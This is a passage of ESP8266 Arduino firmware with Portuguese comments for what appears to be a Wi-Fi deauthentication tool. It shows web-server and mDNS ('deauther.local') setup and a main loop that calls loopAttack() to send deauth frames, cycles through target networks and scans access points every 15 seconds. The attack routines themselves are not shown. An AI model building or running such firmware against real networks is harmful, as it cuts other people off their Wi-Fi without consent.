  events.onConnect([](AsyncEventSourceClient *client) {
    Serial.printf("Cliente SSE conectado a partir de: %s\n", client->client()->remoteIP().toString().c_str());
    client->send("{\"TYPE\":\"CONNECTED\"}", "event", millis());
  });

  // Registra o manipulador de SSE no servidor web
  server.addHandler(&events);

  // Registra todas as rotas e APIs do servidor
  setupWebAPIs();

  // mDNS: responde em http://deauther.local
  if (MDNS.begin("deauther")) {
    MDNS.addService("http", "tcp", 80);
    Serial.println("MDNS responder started");
  }

  // Inicia o servidor Web Assíncrono
  server.begin();
  Serial.println("Servidor AsyncWebServer iniciado com sucesso!");
}

int tentativas = 0;
void loop() {

  // 1. Envia deauth enquanto isAttacking = true
  loopAttack();

  // 2. Se estiver em ataque LOCAL, cicla alvos/canais
  if (testando) { TestandoRedes(); }

  // 3. Mantém mDNS respondendo
  MDNS.update();

  // 4. Verifica se o scan assíncrono terminou e entrega resultados via SSE
  processarScanAP(); 

  // 5. Dispara novo scan a cada 15 s
  if (millis() - lastScan > 15000) {
    iniciarScanAP();
    lastScan = millis();
  }

  // 6. Detecta se a conexão STA caiu e reconecta (até 3 tentativas)
  static bool jaAvisouConectado = false;
  if (WiFi.status() == WL_CONNECTED && !jaAvisouConectado) {
    Serial.println("Conectado à rede: " + WiFi.SSID());
    Serial.println("IP STA: " + WiFi.localIP().toString());
    jaAvisouConectado = true;
    tentativas = 0;

    // Reinicia o mDNS para garantir que vai funcionar na nova interface
    MDNS.end();
    if (MDNS.begin("deauther")) {
      MDNS.addService("http", "tcp", 80);
      Serial.println("mDNS reiniciado com sucesso em modo STA/AP_STA");
    } else {
      Serial.println("Erro ao reiniciar mDNS");
    }

  } else if (WiFi.status() != WL_CONNECTED && tentativas < 3) {
    jaAvisouConectado = false;
    conectarWiFi();
    tentativas++;
  }

  yield(); // cede CPU ao stack Wi-Fi / AsyncTCP / sistema
}